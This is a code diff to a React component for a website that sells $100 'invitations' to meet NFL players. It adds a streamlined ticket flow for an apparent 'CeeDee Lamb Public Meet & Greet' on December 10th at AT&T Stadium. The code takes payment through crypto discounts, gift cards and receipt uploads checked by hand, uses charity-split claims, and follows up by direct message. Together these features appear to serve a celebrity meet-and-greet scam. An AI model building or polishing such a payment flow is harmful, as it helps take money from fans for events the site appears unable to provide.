@@ -8,6 +8,8 @@ import {
   Send, 
   Check, 
   Clock, 
+  Calendar,
+  MapPin,
   User, 
   Mail, 
   Phone, 
@@ -83,6 +85,7 @@ const MESSAGING_PLATFORMS = [
 ];
 
 const INQUIRY_OBJECTIVES = [
+  "Public Meet & Greet — December 10th ($100)",
   "1-on-1 Private Encounter & Photo Op",
   "Autograph & Certified Memorabilia",
   "Live Podcast or Studio Guest Appearance",
@@ -244,8 +247,10 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
       initialStep === "payment" &&
       resolvedName.length > 0 &&
       resolvedEmail.includes("@") &&
-      resolvedPlayer.length > 0 &&
-      resolvedMessaging.length > 0;
+      (resolvedPlayer.toLowerCase().includes("ceedee") &&
+      (initialObjective || "").toLowerCase().includes("public meet")
+        ? true
+        : resolvedPlayer.length > 0 && resolvedMessaging.length > 0);
 
     setStep(canStartOnPayment ? "payment" : "details");
 
@@ -305,6 +310,10 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
 
   const selectedTeam = NFL_TEAMS.find(t => t.id === selectedTeamId) || NFL_TEAMS[0];
   const suggestedPlayers = POPULAR_PLAYERS_BY_TEAM[selectedTeamId] || ["Patrick Mahomes", "Lamar Jackson", "Brock Purdy", "Josh Allen", "Justin Jefferson"];
+  const isPublicCeeDeeMeetGreet =
+    favoritePlayer.trim().toLowerCase().includes("ceedee") &&
+    inquiryObjective.toLowerCase().includes("public meet");
+  const effectiveVenue = isPublicCeeDeeMeetGreet ? "AT&T Stadium · Arlington, Texas" : "Hospitality Concierge Scheduling Queue";
   
   // Calculate price: $100 flat session fee (5% discount if Crypto = $95)
   const isCrypto = paymentMethod === "crypto";
@@ -351,14 +360,14 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
       return;
     }
     if (!email.trim() || !email.includes("@")) {
-      setFormError("Please enter a valid Email Address for pass delivery and status updates.");
+      setFormError("Please enter a valid Gmail or Email Address for ticket delivery and approval.");
       return;
     }
-    if (!favoritePlayer.trim()) {
+    if (!isPublicCeeDeeMeetGreet && !favoritePlayer.trim()) {
       setFormError("Please specify the favorite NFL player you wish to inquire about.");
       return;
     }
-    if (!messagingDetails.trim()) {
+    if (!isPublicCeeDeeMeetGreet && !messagingDetails.trim()) {
       setFormError(`Please provide your ${MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform)?.name} phone number or username handle.`);
       return;
     }
@@ -367,6 +376,9 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
     localStorage.setItem("nfl_guest_sender_name", fullName.trim());
     localStorage.setItem("nfl_guest_buyer_email", email.trim());
     if (phone.trim()) localStorage.setItem("nfl_guest_buyer_phone", phone.trim());
+    if (isPublicCeeDeeMeetGreet && !messagingDetails.trim()) {
+      setMessagingDetails(email.trim());
+    }
 
     // Check if returning user already has a responded or awaiting inquiry so we resume instead of duplicating
     if (!forceBrandNew) {
@@ -386,11 +398,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
     setStep("payment");
   };
 
-  const hasRequiredProfileFields =
-    fullName.trim().length > 0 &&
-    email.trim().includes("@") &&
-    favoritePlayer.trim().length > 0 &&
-    messagingDetails.trim().length > 0;
+  const hasRequiredProfileFields = isPublicCeeDeeMeetGreet
+    ? fullName.trim().length > 0 && email.trim().includes("@")
+    : fullName.trim().length > 0 &&
+      email.trim().includes("@") &&
+      favoritePlayer.trim().length > 0 &&
+      messagingDetails.trim().length > 0;
   const hasReceiptProof =
     receiptImageUrls.length > 0 || receiptImageUrl.trim().length > 0;
   const isGiftCardReady =
@@ -410,7 +423,11 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
     setFormError(null);
 
     if (!hasRequiredProfileFields) {
-      setFormError("Please complete your Full Name, Email Address, Favorite Player, and Preferred Messaging details.");
+      setFormError(
+        isPublicCeeDeeMeetGreet
+          ? "Please enter your Full Name and Gmail Address to continue."
+          : "Please complete your Full Name, Email Address, Favorite Player, and Preferred Messaging details."
+      );
       return;
     }
 
@@ -438,46 +455,60 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
       const nowIso = new Date().toISOString();
 
       const platformObj = MESSAGING_PLATFORMS.find(p => p.id === messagingPlatform);
-      const platformName = platformObj?.name || messagingPlatform.toUpperCase();
+      const platformName = isPublicCeeDeeMeetGreet ? "Gmail" : (platformObj?.name || messagingPlatform.toUpperCase());
+      const resolvedContact = isPublicCeeDeeMeetGreet ? email.trim() : messagingDetails.trim();
+      const targetPlayerName = favoritePlayer.trim() || "CeeDee Lamb";
 
       const orderData: any = {
         id: orderId,
         orderId: orderId,
         bookingId: orderId,
-        shortId: `INQ-${selectedTeam.id}-${favoritePlayer.replace(/\s+/g, "").slice(0, 6).toUpperCase()}`,
+        shortId: `INQ-${selectedTeam.id}-${targetPlayerName.replace(/\s+/g, "").slice(0, 6).toUpperCase()}`,
         ticketCode: passCode,
         qrCode: passCode,
         passCode: passCode,
         rfidCode: rfidCode,
-        securitySignature: "SHA-256 MEET & GREET INVITATION REQUEST ($100)",
-        experienceId: "exp-player-inquiry-session",
-        gameId: "exp-player-inquiry-session",
-        experienceTitle: `MEET & GREET INVITATION REQUEST: ${favoritePlayer.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
-        gameName: `Player Meet & Greet Invitation: ${favoritePlayer}`,
-        eventTitle: `Player Meet & Greet Invitation: ${favoritePlayer}`,
-        itemName: `Meet & Greet Invitation Request (${favoritePlayer}) - $100 ($75 Coordination + $25 BGCA Support)`,
-        experienceType: "player_inquiry",
-        player: favoritePlayer.trim(),
-        favoritePlayer: favoritePlayer.trim(),
+        securitySignature: isPublicCeeDeeMeetGreet
+          ? "SHA-256 CEEDEE LAMB PUBLIC MEET & GREET PASS ($100)"
+          : "SHA-256 MEET & GREET INVITATION REQUEST ($100)",
+        experienceId: isPublicCeeDeeMeetGreet ? "exp-ceedee-public-dec10" : "exp-player-inquiry-session",
+        gameId: isPublicCeeDeeMeetGreet ? "exp-ceedee-public-dec10" : "exp-player-inquiry-session",
+        experienceTitle: isPublicCeeDeeMeetGreet
+          ? "CEEDÉE LAMB PUBLIC MEET & GREET — DECEMBER 10TH"
+          : `MEET & GREET INVITATION REQUEST: ${targetPlayerName.toUpperCase()} (${selectedTeam.city} ${selectedTeam.name})`,
+        gameName: isPublicCeeDeeMeetGreet
+          ? "CeeDee Lamb Public Meet & Greet · December 10th"
+          : `Player Meet & Greet Invitation: ${targetPlayerName}`,
+        eventTitle: isPublicCeeDeeMeetGreet
+          ? "CeeDee Lamb Public Meet & Greet · AT&T Stadium, Arlington, TX"
+          : `Player Meet & Greet Invitation: ${targetPlayerName}`,
+        itemName: isPublicCeeDeeMeetGreet
+          ? "CeeDee Lamb Public Meet & Greet — December 10th · AT&T Stadium ($100)"
+          : `Meet & Greet Invitation Request (${targetPlayerName}) - $100 ($75 Coordination + $25 BGCA Support)`,
+        experienceType: isPublicCeeDeeMeetGreet ? "meet_greet" : "player_inquiry",
+        player: targetPlayerName,
+        favoritePlayer: targetPlayerName,
         teamId: selectedTeam.id,
         teamName: `${selectedTeam.city} ${selectedTeam.name}`,
         homeTeam: `${selectedTeam.city} ${selectedTeam.name}`,
-        awayTeam: "Concierge Coordination",
-        stadium: "Hospitality Concierge Scheduling Queue",
-        venue: "Gridiron Fan Hospitality Concierge",
-        location: "Subject to player availability, confirmed events & authorized arrangements",
-        city: selectedTeam.city,
-        state: "US",
-        date: "Next invite update sent once availability is confirmed",
-        eventDate: "Awaiting Receipt Verification",
-        displayDate: "Subject to Player Availability",
-        formattedDate: "Awaiting Receipt Verification",
-        time: "Priority Concierge Review",
-        timeSlot: "Next Invite Notification",
-        admissionTime: "Upon Confirmed Arrangement",
+        awayTeam: isPublicCeeDeeMeetGreet ? "Public Fan Meet & Greet" : "Concierge Coordination",
+        stadium: effectiveVenue,
+        venue: effectiveVenue,
+        location: isPublicCeeDeeMeetGreet ? "Arlington, Texas" : "Subject to player availability, confirmed events & authorized arrangements",
+        city: isPublicCeeDeeMeetGreet ? "Arlington, TX" : selectedTeam.city,
+        state: isPublicCeeDeeMeetGreet ? "TX" : "US",
+        date: isPublicCeeDeeMeetGreet ? "December 10th" : "Next invite update sent once availability is confirmed",
+        eventDate: isPublicCeeDeeMeetGreet ? "December 10th" : "Awaiting Receipt Verification",
+        displayDate: isPublicCeeDeeMeetGreet ? "December 10th" : "Subject to Player Availability",
+        formattedDate: isPublicCeeDeeMeetGreet ? "December 10th" : "Awaiting Receipt Verification",
+        time: isPublicCeeDeeMeetGreet ? "Doors Open · Public Meet & Greet" : "Priority Concierge Review",
+        timeSlot: isPublicCeeDeeMeetGreet ? "December 10th Public Access" : "Next Invite Notification",
+        admissionTime: isPublicCeeDeeMeetGreet ? "December 10th" : "Upon Confirmed Arrangement",
         tier: "standard",
-        tierName: "MEET & GREET INVITATION REQUEST",
-        seatDetails: `Requested Player: ${favoritePlayer.trim()} · Preferred Contact: ${platformName} (${messagingDetails.trim()})`,
+        tierName: isPublicCeeDeeMeetGreet ? "PUBLIC MEET & GREET ADMISSION" : "MEET & GREET INVITATION REQUEST",
+        seatDetails: isPublicCeeDeeMeetGreet
+          ? `AT&T Stadium · Arlington, Texas · December 10th · Delivery: ${email.trim()}`
+          : `Requested Player: ${targetPlayerName} · Preferred Contact: ${platformName} (${resolvedContact})`,
         quantity: 1,
         guestsCount: 1,
         unitPrice: 100,
@@ -492,7 +523,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         isCharityContribution: true,
         charityNote: `$${CHARITY_ALLOCATION.coordinationFeeUsd} concierge coordination fee + $${CHARITY_ALLOCATION.charitableContributionUsd} earmarked charitable contribution toward ${CHARITY_ALLOCATION.beneficiary}`,
         messagingPlatform: platformName,
-        messagingDetails: messagingDetails.trim(),
+        messagingDetails: resolvedContact,
         inquiryObjective: inquiryObjective,
         specialNotes: specialNotes.trim(),
         inquiryStatus: "awaiting_verification",
@@ -505,12 +536,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         userEmail: email.trim(),
         email: email.trim(),
         userId: auth.currentUser?.uid || `guest_${Date.now()}`,
-        buyerPhone: phone.trim() || messagingDetails.trim(),
+        buyerPhone: phone.trim() || resolvedContact,
         status: "pending", // Never mark manual proof inquiries paid until verified by admin
         orderStatus: "PAYMENT RECEIPT AWAITING VERIFICATION",
         approvalStatus: "RECEIPT UPLOADED ($100) · AWAITING ADMIN VERIFICATION",
         isApproved: false,
-        verificationNotice: `AUDITED BY GRIDIRON FAN HOSPITALITY · $100 INVITATION REQUEST RECEIPT SUBMITTED FOR ${favoritePlayer.toUpperCase()}`,
+        verificationNotice: `AUDITED BY GRIDIRON FAN HOSPITALITY · $100 RECEIPT SUBMITTED FOR ${targetPlayerName.toUpperCase()}`,
         paymentMethod: paymentMethod,
         paymentSessionId: checkoutSessionId,
         paymentReference: paymentRef || `INQ-${checkoutSessionId}`,
@@ -525,12 +556,10 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         imageUrl: stadiumVipImg,
         ticketImageUrl: stadiumVipImg,
         features: [
-          `Requested Athlete: ${favoritePlayer.trim()}`,
-          `Preferred Franchise: ${selectedTeam.city} ${selectedTeam.name}`,
-          `Transparent Breakdown: $${CHARITY_ALLOCATION.coordinationFeeUsd} coordination fee + $${CHARITY_ALLOCATION.charitableContributionUsd} earmarked for ${CHARITY_ALLOCATION.beneficiary}`,
-          `Contact Channel: ${platformName} (${messagingDetails.trim()})`,
-          `Invitations are subject to player availability, confirmed events & authorized arrangements`,
-          `A direct message will be sent to you for the next available invite`
+          `Featured Player: ${targetPlayerName}`,
+          `Franchise: ${selectedTeam.city} ${selectedTeam.name}`,
+          `Venue: ${effectiveVenue}`,
+          `Contact Channel: ${platformName} (${resolvedContact})`
         ]
       };
 
@@ -552,9 +581,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         userId: auth.currentUser?.uid || "guest",
         userEmail: email.trim(),
         buyerName: fullName.trim(),
-        buyerPhone: phone.trim() || messagingDetails.trim(),
+        buyerPhone: phone.trim() || resolvedContact,
         itemType: "ticket",
-        itemName: `NFL Player Inquiry Session (${favoritePlayer.trim()}) [${platformName}]`,
+        itemName: isPublicCeeDeeMeetGreet
+          ? `CeeDee Lamb Public Meet & Greet · Dec 10 (AT&T Stadium, Arlington, TX)`
+          : `NFL Player Inquiry Session (${targetPlayerName}) [${platformName}]`,
+        venue: effectiveVenue,
         price: finalPrice,
         teamId: selectedTeam.id,
         paymentMethod: paymentMethod,
@@ -565,9 +597,9 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         status: "pending_approval",
         orderStatus: "PAYMENT RECEIPT AWAITING VERIFICATION",
         isApproved: false,
-        favoritePlayer: favoritePlayer.trim(),
+        favoritePlayer: targetPlayerName,
         messagingPlatform: platformName,
-        messagingDetails: messagingDetails.trim(),
+        messagingDetails: resolvedContact,
         timestamp: nowIso
       });
 
@@ -576,16 +608,17 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
         id: orderId,
         orderId: orderId,
         sessionId: checkoutSessionId,
-        type: "player_inquiry",
+        type: isPublicCeeDeeMeetGreet ? "ceedee_public_meet_greet" : "player_inquiry",
         category: "player_inquiry",
         customerName: fullName.trim(),
         customerEmail: email.trim(),
-        customerPhone: phone.trim(),
+        customerPhone: phone.trim() || resolvedContact,
         teamId: selectedTeam.id,
         teamName: `${selectedTeam.city} ${selectedTeam.name}`,
-        favoritePlayer: favoritePlayer.trim(),
+        venue: effectiveVenue,
+        favoritePlayer: targetPlayerName,
         messagingPlatform: platformName,
-        messagingDetails: messagingDetails.trim(),
+        messagingDetails: resolvedContact,
         inquiryObjective: inquiryObjective,
         specialNotes: specialNotes.trim(),
         feePaid: finalPrice,
@@ -663,20 +696,41 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
           <div className="flex items-center flex-wrap gap-3 mb-2 text-xs font-bold text-sky-400">
             <span className="inline-flex items-center gap-1.5">
               <Sparkles className="w-3.5 h-3.5 text-sky-400" />
-              Meet &amp; Greet Invitation Request
+              {isPublicCeeDeeMeetGreet
+                ? "CeeDee Lamb Public Meet & Greet · December 10th"
+                : "Meet & Greet Invitation Request"}
             </span>
             <span aria-hidden="true" className="text-zinc-600">·</span>
             <span className="inline-flex items-center gap-1.5 font-mono text-white">
-              <HeartHandshake className="w-3.5 h-3.5 text-sky-400" />
-              $100 ($75 Fee + $25 BGCA Support)
+              {isPublicCeeDeeMeetGreet ? (
+                <>
+                  <MapPin className="w-3.5 h-3.5 text-sky-400" />
+                  <span>AT&amp;T Stadium · Arlington, TX · $100</span>
+                </>
+              ) : (
+                <>
+                  <HeartHandshake className="w-3.5 h-3.5 text-sky-400" />
+                  <span>$100 ($75 Fee + $25 BGCA Support)</span>
+                </>
+              )}
             </span>
           </div>
 
           <h3 className="text-xl sm:text-2xl font-extrabold uppercase tracking-tight text-white leading-tight">
-            GET AN INVITATION TO YOUR FAVORITE PLAYER&apos;S MEET &amp; GREET FOR JUST <span className="text-sky-400">$100</span>
+            {isPublicCeeDeeMeetGreet ? (
+              <>
+                CEEDÉE LAMB PUBLIC MEET &amp; GREET — <span className="text-sky-400">$100 PER TICKET</span>
+              </>
+            ) : (
+              <>
+                GET AN INVITATION TO YOUR FAVORITE PLAYER&apos;S MEET &amp; GREET FOR JUST <span className="text-sky-400">$100</span>
+              </>
+            )}
           </h3>
           <p className="text-xs text-zinc-300 mt-1.5 max-w-lg font-medium leading-relaxed">
-            Your favorite player could be closer than you think! Submit your request for an opportunity to attend an exclusive meet-and-greet experience with the player you admire. Invitations are subject to player availability, confirmed events, and authorized arrangements — a direct message will be sent to you for the next available invite.
+            {isPublicCeeDeeMeetGreet
+              ? "Enter your Full Name and Gmail Address below to proceed immediately to checkout for December 10th at AT&T Stadium, Arlington, Texas."
+              : "Your favorite player could be closer than you think! Submit your request for an opportunity to attend an exclusive meet-and-greet experience with the player you admire. Invitations are subject to player availability, confirmed events, and authorized arrangements — a direct message will be sent to you for the next available invite."}
           </p>
 
           {/* Mode Switcher: New Inquiry vs Already Started? Check Awaiting Details */}
@@ -692,7 +746,7 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
               )}
             >
               <Sparkles className="w-3.5 h-3.5 shrink-0" />
-              <span>New Player Inquiry</span>
+              <span>{isPublicCeeDeeMeetGreet ? "Reserve Slot ($100)" : "New Player Inquiry"}</span>
             </button>
             <button
               type="button"
@@ -724,12 +778,12 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
             <div className="flex items-center gap-2 mt-4 pt-4 border-t border-white/5 text-[9px] font-black uppercase tracking-widest">
               <div className={cn("flex items-center gap-1.5", step === "details" ? "text-blue-400" : "text-zinc-500")}>
                 <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "details" ? "bg-blue-600 text-white" : "bg-zinc-800 text-zinc-400")}>1</span>
-                <span>Player & Contact Info</span>
+                <span>{isPublicCeeDeeMeetGreet ? "Name & Gmail" : "Player & Contact Info"}</span>
               </div>
               <ArrowRight className="w-3 h-3 text-zinc-700" />
               <div className={cn("flex items-center gap-1.5", step === "payment" ? "text-blue-400" : "text-zinc-500")}>
                 <span className={cn("w-5 h-5 rounded-full flex items-center justify-center font-mono text-[10px]", step === "payment" ? "bg-blue-600 text-white" : "bg-zinc-800 text-zinc-400")}>2</span>
-                <span>$100 Contribution & Proof</span>
+                <span>{isPublicCeeDeeMeetGreet ? "Checkout ($100)" : "$100 Contribution & Proof"}</span>
               </div>
               <ArrowRight className="w-3 h-3 text-zinc-700" />
               <div className={cn("flex items-center gap-1.5", step === "success" ? "text-emerald-400" : "text-zinc-500")}>
@@ -990,276 +1044,382 @@ export const PlayerInquiryModal: React.FC<PlayerInquiryModalProps> = ({
                   </div>
                 );
               })()}
-              {/* Section 1: Target Team & Player */}
-              <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
-                <div className="flex items-center justify-between">
-                  <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-blue-500" />
-                    1. Target NFL Franchise & Favorite Player
-                  </h4>
-                  <span className="text-[9px] font-mono text-zinc-500 uppercase">ALL 32 TEAMS ELIGIBLE</span>
-                </div>
+              {isPublicCeeDeeMeetGreet ? (
+                <div className="space-y-5">
+                  {/* Streamlined Public Meet & Greet Event Recap + Name & Gmail Form */}
+                  <div className="p-4 sm:p-5 rounded-3xl bg-[#040B1A] border border-[#60A5FA]/30 grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
+                    <div className="p-3 rounded-2xl bg-[#030712]/80 border border-white/10">
+                      <span className="text-[10px] font-bold uppercase tracking-wider text-[#94A3B8] flex items-center gap-1.5">
+                        <Calendar className="w-3.5 h-3.5 text-[#60A5FA]" />
+                        Date
+                      </span>
+                      <span className="text-sm font-extrabold text-white mt-0.5 block">
+                        December 10th
+                      </span>
+                    </div>
+                    <div className="p-3 rounded-2xl bg-[#030712]/80 border border-white/10">
+                      <span className="text-[10px] font-bold uppercase tracking-wider text-[#94A3B8] flex items-center gap-1.5">
+                        <MapPin className="w-3.5 h-3.5 text-[#60A5FA]" />
+                        Venue
+                      </span>
+                      <span className="text-sm font-extrabold text-white mt-0.5 block">
+                        AT&amp;T Stadium, Arlington, TX
+                      </span>
+                    </div>
+                    <div className="p-3 rounded-2xl bg-[#030712]/80 border border-[#60A5FA]/35">
+                      <span className="text-[10px] font-bold uppercase tracking-wider text-[#93C5FD] block">
+                        Ticket Price
+                      </span>
+                      <span className="font-mono text-base font-black text-white mt-0.5 block">
+                        $100 Per Ticket
+                      </span>
+                    </div>
+                  </div>
 
-                {/* Team Selection */}
-                <div className="space-y-2">
-                  <label className="text-[10px] font-black uppercase text-zinc-400 block tracking-wider">
-                    Select NFL Franchise
-                  </label>
-                  <div className="flex items-center gap-3 p-3 bg-zinc-900 rounded-2xl border border-white/10">
-                    <img 
-                      src={getLogoUrl(selectedTeam.id)} 
-                      alt={selectedTeam.name} 
-                      className="w-10 h-10 object-contain shrink-0" 
-                    />
-                    <div className="flex-1 min-w-0">
-                      <select
-                        value={selectedTeamId}
-                        onChange={(e) => setSelectedTeamId(e.target.value)}
-                        className="w-full bg-transparent text-sm font-black text-white uppercase focus:outline-none cursor-pointer"
-                      >
-                        {NFL_TEAMS.map(team => (
-                          <option key={team.id} value={team.id} className="bg-zinc-900 text-white font-sans text-xs">
-                            {team.city} {team.name} ({team.id})
-                          </option>
-                        ))}
-                      </select>
-                      <p className="text-[9px] text-zinc-500 font-mono mt-0.5">
-                        Selected: {selectedTeam.city} {selectedTeam.name}
+                  <div className="space-y-4 p-5 sm:p-6 bg-zinc-900/50 rounded-3xl border border-white/10">
+                    <div>
+                      <h4 className="text-sm font-black uppercase tracking-wider text-white">
+                        Enter Your Name &amp; Gmail to Proceed to Checkout
+                      </h4>
+                      <p className="text-xs text-zinc-400 mt-0.5">
+                        Quick registration — only your Name and Gmail are needed to secure your December 10th slot.
                       </p>
+                    </div>
+
+                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                      <div className="space-y-1.5">
+                        <label
+                          htmlFor="ceedee-public-full-name"
+                          className="text-[10px] font-black uppercase text-zinc-300 flex items-center gap-1.5"
+                        >
+                          <User className="w-3.5 h-3.5 text-[#60A5FA]" />
+                          Full Name <span className="text-rose-400">*</span>
+                        </label>
+                        <input
+                          id="ceedee-public-full-name"
+                          type="text"
+                          required
+                          autoFocus
+                          placeholder="Enter your full name"
+                          value={fullName}
+                          onChange={(e) => setFullName(e.target.value)}
+                          className="w-full min-h-[48px] bg-zinc-950 border border-white/15 rounded-xl px-4 py-3 text-sm text-white font-bold placeholder-zinc-500 focus:outline-none focus:border-blue-500"
+                        />
+                      </div>
+
+                      <div className="space-y-1.5">
+                        <label
+                          htmlFor="ceedee-public-gmail"
+                          className="text-[10px] font-black uppercase text-zinc-300 flex items-center gap-1.5"
+                        >
+                          <Mail className="w-3.5 h-3.5 text-[#60A5FA]" />
+                          Gmail Address <span className="text-rose-400">*</span>
+                        </label>
+                        <input
+                          id="ceedee-public-gmail"
+                          type="email"
+                          required
+                          placeholder="yourname@gmail.com"
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                          className="w-full min-h-[48px] bg-zinc-950 border border-white/15 rounded-xl px-4 py-3 text-sm text-white font-bold placeholder-zinc-500 focus:outline-none focus:border-blue-500"
+                        />
+                      </div>
+                    </div>
+
+                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-2">
+                      <button
+                        type="button"
+                        onClick={() => setInquiryObjective(INQUIRY_OBJECTIVES[1])}
+                        className="text-xs font-semibold text-zinc-400 hover:text-white underline text-left cursor-pointer"
+                      >
+                        Looking for a different player inquiry?
+                      </button>
+
+                      <button
+                        type="submit"
+                        className="w-full sm:w-auto min-h-[52px] px-8 py-3.5 bg-gradient-to-r from-[#003594] via-[#1D4ED8] to-[#003594] hover:brightness-115 text-white border border-[#B0B7BC]/35 font-extrabold uppercase text-xs tracking-wider rounded-2xl transition-all shadow-lg shadow-blue-900/40 flex items-center justify-center gap-2.5 cursor-pointer"
+                      >
+                        <span>PROCEED TO CHECKOUT — $100</span>
+                        <ArrowRight className="w-4 h-4" />
+                      </button>
                     </div>
                   </div>
                 </div>
+              ) : (
+                <>
+                  {/* Section 1: Target Team & Player */}
+                  <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
+                    <div className="flex items-center justify-between">
+                      <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
+                        <span className="w-2 h-2 rounded-full bg-blue-500" />
+                        1. Target NFL Franchise & Favorite Player
+                      </h4>
+                      <span className="text-[9px] font-mono text-zinc-500 uppercase">ALL 32 TEAMS ELIGIBLE</span>
+                    </div>
 
-                {/* Favorite Player Input */}
-                <div className="space-y-2">
-                  <div className="flex items-center justify-between">
-                    <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider">
-                      Favorite Player to Inquire About <span className="text-rose-400">*</span>
-                    </label>
-                    <span className="text-[9px] text-zinc-500 font-mono">Active or Legend</span>
-                  </div>
-                  <input
-                    type="text"
-                    required
-                    placeholder="e.g. Patrick Mahomes, Lamar Jackson, Brock Purdy..."
-                    value={favoritePlayer}
-                    onChange={(e) => setFavoritePlayer(e.target.value)}
-                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-sm text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
-                  />
+                    {/* Team Selection */}
+                    <div className="space-y-2">
+                      <label className="text-[10px] font-black uppercase text-zinc-400 block tracking-wider">
+                        Select NFL Franchise
+                      </label>
+                      <div className="flex items-center gap-3 p-3 bg-zinc-900 rounded-2xl border border-white/10">
+                        <img 
+                          src={getLogoUrl(selectedTeam.id)} 
+                          alt={selectedTeam.name} 
+                          className="w-10 h-10 object-contain shrink-0" 
+                        />
+                        <div className="flex-1 min-w-0">
+                          <select
+                            value={selectedTeamId}
+                            onChange={(e) => setSelectedTeamId(e.target.value)}
+                            className="w-full bg-transparent text-sm font-black text-white uppercase focus:outline-none cursor-pointer"
+                          >
+                            {NFL_TEAMS.map(team => (
+                              <option key={team.id} value={team.id} className="bg-zinc-900 text-white font-sans text-xs">
+                                {team.city} {team.name} ({team.id})
+                              </option>
+                            ))}
+                          </select>
+                          <p className="text-[9px] text-zinc-500 font-mono mt-0.5">
+                            Selected: {selectedTeam.city} {selectedTeam.name}
+                          </p>
+                        </div>
+                      </div>
+                    </div>
 
-                  {/* Player suggestions for selected team */}
-                  <div className="flex flex-wrap items-center gap-1.5 pt-1">
-                    <span className="text-[9px] font-mono text-zinc-500 uppercase">Suggestions:</span>
-                    {suggestedPlayers.map(pName => (
-                      <button
-                        key={pName}
-                        type="button"
-                        onClick={() => setFavoritePlayer(pName)}
-                        className={cn(
-                          "px-2.5 py-1 rounded-lg text-[9px] font-bold transition-all cursor-pointer",
-                          favoritePlayer === pName
-                            ? "bg-blue-600 text-white"
-                            : "bg-zinc-800 hover:bg-zinc-700 text-zinc-300"
-                        )}
+                    {/* Favorite Player Input */}
+                    <div className="space-y-2">
+                      <div className="flex items-center justify-between">
+                        <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider">
+                          Favorite Player to Inquire About <span className="text-rose-400">*</span>
+                        </label>
+                        <span className="text-[9px] text-zinc-500 font-mono">Active or Legend</span>
+                      </div>
+                      <input
+                        type="text"
+                        required
+                        placeholder="e.g. Patrick Mahomes, Lamar Jackson, Brock Purdy..."
+                        value={favoritePlayer}
+                        onChange={(e) => setFavoritePlayer(e.target.value)}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-sm text-white font-bold placeholder-zinc-600 focus:outline-none focus:border-blue-500"
+                      />
+
+                      {/* Player suggestions for selected team */}
+                      <div className="flex flex-wrap items-center gap-1.5 pt-1">
+                        <span className="text-[9px] font-mono text-zinc-500 uppercase">Suggestions:</span>
+                        {suggestedPlayers.map(pName => (
+                          <button
+                            key={pName}
+                            type="button"
+                            onClick={() => setFavoritePlayer(pName)}
+                            className={cn(
+                              "px-2.5 py-1 rounded-lg text-[9px] font-bold transition-all cursor-pointer",
+                              favoritePlayer === pName
+                                ? "bg-blue-600 text-white"
+                                : "bg-zinc-800 hover:bg-zinc-700 text-zinc-300"
+                            )}
+                          >
+                            {pName}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+
+                    {/* Inquiry Objective */}
+                    <div className="space-y-2 pt-2">
+                      <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
+                        Inquiry Objective / Intended Experience
+                      </label>
+                      <select
+                        value={inquiryObjective}
+                        onChange={(e) => setInquiryObjective(e.target.value)}
+                        className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-xs text-white font-bold focus:outline-none focus:border-blue-500"
                       >
-                        {pName}
-                      </button>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Inquiry Objective */}
-                <div className="space-y-2 pt-2">
-                  <label className="text-[10px] font-black uppercase text-zinc-400 tracking-wider block">
-                    Inquiry Objective / Intended Experience
-                  </label>
-                  <select
-                    value={inquiryObjective}
-                    onChange={(e) => setInquiryObjective(e.target.value)}
-                    className="w-full bg-zinc-900 border border-white/10 rounded-2xl px-4 py-3 text-xs text-white font-bold focus:outline-none focus:border-blue-500"
-                  >
-                    {INQUIRY_OBJECTIVES.map(obj => (
-                      <option key={obj} value={obj} className="bg-zinc-900 text-white text-xs">
-                        {obj}
-                      </option>
-                    ))}
-                  </select>
-                </div>
-              </div>
-
-              {/* Section 2: Customer Identity & Preferred Messaging Platform */}
-              <div className="space-y-4 p-5 bg-zinc-900/40 rounded-3xl border border-white/5">
-                <div className="flex items-center justify-between">
-                  <h4 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-emerald-500" />
-                    2. Your Contact & Messaging Platform
-                  </h4>
-                  <span className="text-[9px] font-mono text-emerald-400">WHERE WE SEND PLAYER DETAILS</span>
-                </div>
-
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  {/* Full Name */}
-                  <div className="space-y-1.5">
-                    <label className="text-[10px] font-black uppercase text-zinc-400 flex items-center gap-1.5">
-                      <User className="w-3.5 h-3.5 text-zinc-500" />
-                      Full Name <span className="text-rose-400">*</span>
-                    </label>
-                    <input
-                      type="text"
-                      required
